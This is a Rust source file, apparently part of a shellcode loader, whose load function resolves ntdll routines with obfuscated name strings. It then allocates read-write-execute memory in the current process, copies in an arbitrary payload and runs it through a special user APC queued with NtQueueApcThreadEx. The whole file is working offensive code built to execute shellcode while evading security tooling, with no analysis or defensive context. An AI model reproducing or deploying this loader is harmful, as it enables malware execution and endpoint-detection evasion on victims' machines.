use obfstr::obfstr;
use std::{ffi::c_void, mem::transmute, process::id, ptr::null_mut};
use windows_sys::Win32::System::Threading::GetCurrentThreadId;

use crate::run::resolve::{get_module_base_addr, get_proc_addr};
use crate::run::types::{
    CLIENT_ID, HANDLE, NtAllocateVirtualMemory, NtClose, NtOpenProcess, NtOpenThread,
    NtQueueApcThreadEx, NtWriteVirtualMemory, OBJECT_ATTRIBUTES,
};

const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_EXECUTE_READWRITE: u32 = 0x40;
const PROCESS_ALL_ACCESS: u32 = 0x001FFFFF;
const THREAD_ALL_ACCESS: u32 = 0x001FFFFF;
const QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC: HANDLE = 0x01;

pub fn load(payload: Vec<u8>) {
    unsafe {
        let ntdll_base_address = get_module_base_addr(obfstr!("ntdll.dll"));

        let nt_open_process: NtOpenProcess =
            transmute(get_proc_addr(ntdll_base_address, obfstr!("NtOpenProcess")));
        let nt_allocate_virtual_memory: NtAllocateVirtualMemory = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtAllocateVirtualMemory"),
        ));
        let nt_write_virtual_memory: NtWriteVirtualMemory = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtWriteVirtualMemory"),
        ));
        let nt_open_thread: NtOpenThread =
            transmute(get_proc_addr(ntdll_base_address, obfstr!("NtOpenThread")));
        let nt_queue_apc_thread_ex: NtQueueApcThreadEx = transmute(get_proc_addr(
            ntdll_base_address,
            obfstr!("NtQueueApcThreadEx"),
        ));
        let nt_close: NtClose = transmute(get_proc_addr(ntdll_base_address, obfstr!("NtClose")));

        // Current process
        let pid = id();

        let mut process_handle: HANDLE = 0;
        let mut object_attributes: OBJECT_ATTRIBUTES = std::mem::zeroed();
        let mut client_id: CLIENT_ID = std::mem::zeroed();
        client_id.UniqueProcess = pid as HANDLE;

        let status = nt_open_process(
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &mut object_attributes,
            &mut client_id,
        );

        if status != 0 {
            return;
        }

        // Allocate memory
        let payload_len = payload.len();
        let mut base_address: *mut c_void = null_mut();
        let mut region_size = payload_len;

        let status = nt_allocate_virtual_memory(
            process_handle,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if status != 0 {
            nt_close(process_handle);
            return;
        }

        // Write memory
        let status = nt_write_virtual_memory(
            process_handle,
            base_address,
            payload.as_ptr() as *mut c_void,
            payload_len,
            null_mut(),
        );

        if status != 0 {
            nt_close(process_handle);
            return;
        }

        // Queue APC
        let thread_id = GetCurrentThreadId();
        let mut thread_handle: HANDLE = 0;
        let mut thread_client_id: CLIENT_ID = std::mem::zeroed();
        let mut thread_obj_attr: OBJECT_ATTRIBUTES = std::mem::zeroed();
        thread_client_id.UniqueThread = thread_id as HANDLE;

        let status = nt_open_thread(
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            &mut thread_obj_attr,
            &mut thread_client_id,
        );

        if status != 0 {
            nt_close(process_handle);
            return;
        }

        nt_queue_apc_thread_ex(
            thread_handle,
            QUEUE_USER_APC_FLAGS_SPECIAL_USER_APC,
            transmute(base_address),
            null_mut(),
            null_mut(),
            null_mut(),
        );

        nt_close(thread_handle);
        nt_close(process_handle);
    }
}
